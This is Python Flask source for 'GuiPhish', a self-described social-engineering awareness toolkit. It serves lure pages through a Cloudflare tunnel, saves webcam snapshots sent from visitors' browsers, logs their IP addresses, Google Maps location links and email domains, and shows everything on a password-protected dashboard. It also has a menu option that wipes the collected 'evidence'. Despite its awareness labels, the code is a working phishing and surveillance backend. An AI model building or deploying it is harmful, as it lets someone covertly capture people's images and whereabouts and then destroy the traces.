import os
import json
import shutil
import random
import base64
from datetime import datetime
from flask import Flask, request, jsonify, send_file, redirect, session

# ================= CONFIG =================

DASHBOARD_USER = "admin"
DASHBOARD_PASS = "guiphish"

app = Flask(__name__)
app.secret_key = "guiphish_dashboard_secret"

PASTAS = ["logs", "fotos", "relatorios"]

for pasta in PASTAS:
    os.makedirs(pasta, exist_ok=True)

# ================= BANNERS =================

BANNERS = [
r"""
  ██████╗ ██╗   ██╗██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
 ██╔════╝ ██║   ██║██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
 ██║  ███╗██║   ██║██║██████╔╝███████║██║███████╗███████║
 ██║   ██║██║   ██║██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
 ╚██████╔╝╚██████╔╝██║██║     ██║  ██║██║███████║██║  ██║
  ╚═════╝  ╚═════╝ ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝

        🔐 GuiPhish Awareness Lab
        🎣 Security Awareness Toolkit
        🐧 Running on Kali Linux
        CRIADO POR: Geovanni Andrade
""",
r"""
   _____       _ _____  _     _     _
  / ____|     (_)  __ \| |   (_)   | |
 | |  __ _   _ _| |__) | |__  _ ___| |__
 | | |_ | | | | |  ___/| '_ \| / __| '_ \
 | |__| | |_| | | |    | | | | \__ \ | | |
  \_____|\__,_|_|_|    |_| |_|_|___/_| |_|

        🧠 Security Education Toolkit
        📊 Logs • Reports • Dashboard
        CRIADO POR: Geovanni Andrade
""",
r"""
   ▄████  █    ██  ██▓ ██▓███   ██░ ██  ██▓  ██████  ██░ ██
  ██▒ ▀█▒ ██  ▓██▒▓██▒▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒
 ▒██░▄▄▄░▓██  ▒██░▒██▒▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░
 ░▓█  ██▓▓▓█  ░██░░██░▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██
 ░▒▓███▀▒▒▒█████▓ ░██░▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓

        📸 Camera Awareness
        🌍 Location Awareness
        📧 Email Simulation
""",
r"""
        👁️ Browser Permission Lab
        📡 Camera • Location • Email
        🛡️ Authorized Awareness Only
""",
r"""
        🎣 Social Engineering Awareness
        🔐 GuiPhish Toolkit
        📊 Dashboard Enabled
""",
r"""
        📸 Camera | 🌍 Location | 📧 Email
        🧾 Reports | 📊 Dashboard | 🧹 Cleanup
        CRIADO POR: Geovanni Andrade
"""
]

# ================= FUNÇÕES =================

def ler_eventos():
    caminho = "logs/eventos.jsonl"

    if not os.path.exists(caminho):
        return []

    eventos = []

    with open(caminho, "r", encoding="utf-8") as f:
        for linha in f:
            try:
                eventos.append(json.loads(linha))
            except Exception:
                pass

    return eventos


def mostrar_logs():
    eventos = ler_eventos()

    print("\n📊 Últimos eventos:\n")

    if not eventos:
        print("[!] Nenhum evento registrado ainda.\n")
        return

    for evento in eventos[-10:]:
        print(
            f"- {evento.get('timestamp')} | "
            f"{evento.get('tipo')} | "
            f"{evento.get('status')} | "
            f"IP: {evento.get('ip')}"
        )

        if evento.get("google_maps") not in [None, "N/A"]:
            print(f"  🌍 Maps: {evento.get('google_maps')}")

        if evento.get("email_domain") not in [None, "N/A"]:
            print(f"  📧 Domínio: {evento.get('email_domain')}")

    print("")


def gerar_relatorio():
    eventos = ler_eventos()

    fotos = []
    if os.path.exists("fotos"):
        fotos = [f for f in os.listdir("fotos") if f.endswith(".jpg")]

    total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
    total_localizacao = len([e for e in eventos if e.get("tipo") == "localizacao"])
    total_email = len([e for e in eventos if e.get("tipo") == "email"])

    nome = f"relatorios/relatorio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    with open(nome, "w", encoding="utf-8") as f:
        f.write("GuiPhish Awareness Lab - Relatório\n")
        f.write("=" * 45 + "\n\n")
        f.write(f"Gerado em: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        f.write(f"Total de eventos: {len(eventos)}\n")
        f.write(f"Eventos de câmera: {total_camera}\n")
        f.write(f"Eventos de localização: {total_localizacao}\n")
        f.write(f"Eventos de e-mail/conta: {total_email}\n")
        f.write(f"Fotos salvas: {len(fotos)}\n\n")
        f.write("Últimos eventos:\n")

        for evento in eventos[-20:]:
            f.write(json.dumps(evento, ensure_ascii=False) + "\n")

    print(f"\n[+] Relatório gerado: {nome}\n")


def limpar_evidencias():
    confirmacao = input("\n[!] Apagar fotos, logs e relatórios locais? Digite SIM para confirmar: ")

    if confirmacao != "SIM":
        print("[+] Operação cancelada.\n")
        return

    for pasta in PASTAS:
        if os.path.exists(pasta):
            shutil.rmtree(pasta)
        os.makedirs(pasta, exist_ok=True)

    print("[+] Evidências locais apagadas com sucesso.\n")


def menu():
    print("\n[+] GuiPhish Awareness Lab\n")
    print("1) 📸 Testar permissão de câmera")
    print("2) 🌍 Testar permissão de localização")
    print("3) 📊 Dashboard / login")
    print("4) 🧾 Gerar relatório do lab")
    print("5) 🧹 Limpar evidências locais")
    print("6) 📧 Simulação de e-mail/conta")
    print("7) 🛑 Sair")

    return input("\nDigite a opção: ")


def autenticado():
    return session.get("logado") is True

# ================= ROTAS PRINCIPAIS =================

@app.route("/")
def index():
    return send_file("index.html")


@app.route("/email")
def email():
    return send_file("email.html")


@app.route("/foto/<nome>")
def foto(nome):
    if not autenticado():
        return redirect("/login")

    nome_seguro = os.path.basename(nome)
    caminho = os.path.join("fotos", nome_seguro)

    if not os.path.exists(caminho):
        return "Foto não encontrada", 404

    return send_file(caminho)

# ================= LOGIN =================

@app.route("/login", methods=["GET", "POST"])
def login():
    erro = ""

    if request.method == "POST":
        user = request.form.get("user")
        senha = request.form.get("pass")

        if user == DASHBOARD_USER and senha == DASHBOARD_PASS:
            session["logado"] = True
            return redirect("/dashboard")

        erro = "Login inválido"

    return f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>GuiPhish Login</title>
<style>
body {{
    background: radial-gradient(circle at top, #123524, #020617 60%);
    color: #00ff88;
    font-family: monospace;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 0;
}}
.card {{
    background: rgba(2, 6, 23, 0.92);
    border: 1px solid #00ff88;
    box-shadow: 0 0 25px rgba(0,255,136,0.25);
    padding: 35px;
    border-radius: 16px;
    width: 360px;
    text-align: center;
}}
input {{
    width: 90%;
    padding: 12px;
    margin: 10px 0;
    background: #020617;
    border: 1px solid #00ff88;
    color: #00ff88;
    border-radius: 8px;
}}
button {{
    width: 95%;
    padding: 12px;
    background: #00ff88;
    color: #020617;
    font-weight: bold;
    border: none;
    border-radius: 8px;
    cursor: pointer;
}}
.erro {{
    color: #ff4d4d;
    margin-top: 12px;
}}
</style>
</head>
<body>
<div class="card">
    <h1>🔐 GuiPhish</h1>
    <p>Dashboard Login</p>
    <form method="POST">
        <input name="user" placeholder="Usuário">
        <input name="pass" type="password" placeholder="Senha">
        <button>Entrar</button>
    </form>
    <p class="erro">{erro}</p>
</div>
</body>
</html>
"""


@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")

# ================= DASHBOARD =================

@app.route("/dashboard")
def dashboard():
    if not autenticado():
        return redirect("/login")

    eventos = ler_eventos()
    fotos = []

    if os.path.exists("fotos"):
        fotos = sorted([f for f in os.listdir("fotos") if f.endswith(".jpg")], reverse=True)

    total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
    total_localizacao = len([e for e in eventos if e.get("tipo") == "localizacao"])
    total_email = len([e for e in eventos if e.get("tipo") == "email"])

    ultimos_eventos_html = ""

    for e in eventos[-30:][::-1]:
        maps = ""
        email = ""

        if e.get("google_maps") not in [None, "N/A"]:
            maps = f"<a href='{e.get('google_maps')}' target='_blank'>🌍 Google Maps</a>"

        if e.get("email_domain") not in [None, "N/A"]:
            email = f"<span>📧 {e.get('email_domain')}</span>"

        ultimos_eventos_html += f"""
        <tr>
            <td>{e.get('timestamp')}</td>
            <td>{e.get('tipo')}</td>
            <td>{e.get('status')}</td>
            <td>{e.get('ip')}</td>
            <td>{maps} {email}</td>
        </tr>
        """

    fotos_html = ""

    for foto in fotos[:30]:
        fotos_html += f"""
        <div class="photo-card">
            <img src="/foto/{foto}">
            <p>{foto}</p>
        </div>
        """

    return f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>GuiPhish Dashboard</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
body {{
    margin: 0;
    background: #020617;
    color: #e5e7eb;
    font-family: Arial, sans-serif;
}}
header {{
    padding: 25px;
    background: linear-gradient(90deg, #020617, #052e16);
    border-bottom: 1px solid #00ff88;
    display: flex;
    justify-content: space-between;
    align-items: center;
}}
header h1 {{
    color: #00ff88;
    margin: 0;
}}
button, .btn {{
    background: #00ff88;
    color: #020617;
    border: none;
    padding: 10px 16px;
    border-radius: 8px;
    font-weight: bold;
    cursor: pointer;
    text-decoration: none;
}}
.container {{
    padding: 25px;
}}
.cards {{
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 15px;
    margin-bottom: 25px;
}}
.card {{
    background: #0f172a;
    border: 1px solid #1f2937;
    border-radius: 14px;
    padding: 20px;
    box-shadow: 0 0 18px rgba(0,255,136,0.08);
}}
.card h2 {{
    margin: 0;
    color: #00ff88;
}}
.grid {{
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 20px;
}}
.photos {{
    display: flex;
    flex-wrap: wrap;
    gap: 12px;
}}
.photo-card {{
    background: #0f172a;
    border: 1px solid #1f2937;
    border-radius: 12px;
    padding: 10px;
    width: 210px;
}}
.photo-card img {{
    width: 100%;
    border-radius: 8px;
}}
.photo-card p {{
    font-size: 11px;
    color: #94a3b8;
}}
table {{
    width: 100%;
    border-collapse: collapse;
    background: #0f172a;
    border-radius: 12px;
    overflow: hidden;
}}
th, td {{
    padding: 10px;
    border-bottom: 1px solid #1f2937;
    font-size: 13px;
}}
th {{
    color: #00ff88;
    text-align: left;
}}
a {{
    color: #38bdf8;
}}
canvas {{
    max-height: 280px;
}}
</style>
</head>
<body>

<header>
    <h1>📊 GuiPhish Dashboard</h1>
    <div>
        <button onclick="location.reload()">🔄 Atualizar</button>
        <a class="btn" href="/logout">🔓 Logout</a>
    </div>
</header>

<div class="container">

    <div class="cards">
        <div class="card"><h2>{len(eventos)}</h2><p>Total de eventos</p></div>
        <div class="card"><h2>{total_camera}</h2><p>Câmera</p></div>
        <div class="card"><h2>{total_localizacao}</h2><p>Localização</p></div>
        <div class="card"><h2>{total_email}</h2><p>E-mail</p></div>
    </div>

    <div class="grid">
        <div class="card">
            <h2>📈 Eventos por tipo</h2>
            <canvas id="grafico"></canvas>
        </div>

        <div class="card">
            <h2>📸 Fotos recentes</h2>
            <div class="photos">
                {fotos_html}
            </div>
        </div>
    </div>

    <br>

    <div class="card">
        <h2>📋 Últimos eventos</h2>
        <table>
            <tr>
                <th>Data/Hora</th>
                <th>Tipo</th>
                <th>Status</th>
                <th>IP</th>
                <th>Detalhes</th>
            </tr>
            {ultimos_eventos_html}
        </table>
    </div>

</div>

<script>
const ctx = document.getElementById('grafico');

new Chart(ctx, {{
    type: 'bar',
    data: {{
        labels: ['Câmera', 'Localização', 'E-mail'],
        datasets: [{{
            label: 'Eventos',
            data: [{total_camera}, {total_localizacao}, {total_email}]
        }}]
    }},
    options: {{
        plugins: {{
            legend: {{
                labels: {{
                    color: '#e5e7eb'
                }}
            }}
        }},
        scales: {{
            x: {{
                ticks: {{ color: '#e5e7eb' }}
            }},
            y: {{
                ticks: {{ color: '#e5e7eb' }}
            }}
        }}
    }}
}});
</script>

</body>
</html>
"""

# ================= EVENTOS =================

@app.route("/evento", methods=["POST"])
def evento():
    data = request.json or {}

    tipo = data.get("tipo", "desconhecido")

    evento_log = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": request.remote_addr,
        "tipo": tipo,
        "acao": data.get("acao", "N/A"),
        "status": data.get("status", "N/A"),
        "user_agent": data.get("userAgent", "N/A"),
        "platform": data.get("platform", "N/A"),
        "language": data.get("language", "N/A"),
        "timezone": data.get("timezone", "N/A"),
        "google_maps": data.get("google_maps", "N/A"),
        "email_domain": data.get("email_domain", "N/A")
    }

    with open("logs/eventos.jsonl", "a", encoding="utf-8") as f:
        f.write(json.dumps(evento_log, ensure_ascii=False) + "\n")

    print(f"\n[+] EVENTO REGISTRADO: {tipo} | {evento_log['status']} | IP: {request.remote_addr}")

    if evento_log["google_maps"] != "N/A":
        print(f"[+] Google Maps: {evento_log['google_maps']}")

    if tipo == "email":
        print(f"[+] Domínio informado: {evento_log['email_domain']}")

    return jsonify({"ok": True})

# ================= CAPTURA =================

@app.route("/capture", methods=["POST"])
def capture():
    try:
        data = request.json or {}

        if "image" not in data:
            return jsonify({"ok": False, "erro": "sem imagem"}), 400

        img = data.get("image").split(",")[1]
        img_bytes = base64.b64decode(img)

        nome = f"fotos/{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}.jpg"

        with open(nome, "wb") as f:
            f.write(img_bytes)

        print(f"[+] FOTO SALVA: {nome}")

        return jsonify({"ok": True, "arquivo": nome})

    except Exception as e:
        print(f"[-] Erro ao salvar foto: {e}")
        return jsonify({"ok": False}), 500

# ================= MAIN =================

if __name__ == "__main__":
    print(random.choice(BANNERS))

    while True:
        escolha = menu()

        if escolha == "1":
            print("\n[+] Modo câmera ativo. Iniciando Flask...")
            print("[+] Use o link principal do Cloudflared.\n")
            break

        elif escolha == "2":
            print("\n[+] Modo localização ativo. Iniciando Flask...")
            print("[+] Use o link principal do Cloudflared.\n")
            break

        elif escolha == "3":
            print("\n[+] Dashboard disponível em:")
            print("    https://SEU-LINK.trycloudflare.com/login")
            print("[+] Login padrão:")
            print("    usuário: admin")
            print("    senha: guiphish\n")
            break

        elif escolha == "4":
            gerar_relatorio()

        elif escolha == "5":
            limpar_evidencias()

        elif escolha == "6":
            print("\n[+] Página de e-mail disponível em:")
            print("    https://SEU-LINK.trycloudflare.com/email\n")
            break

        elif escolha == "7":
            print("\n[+] Saindo...\n")
            exit()

        else:
            print("\n[!] Opção inválida.\n")

    app.run(host="0.0.0.0", port=10000)
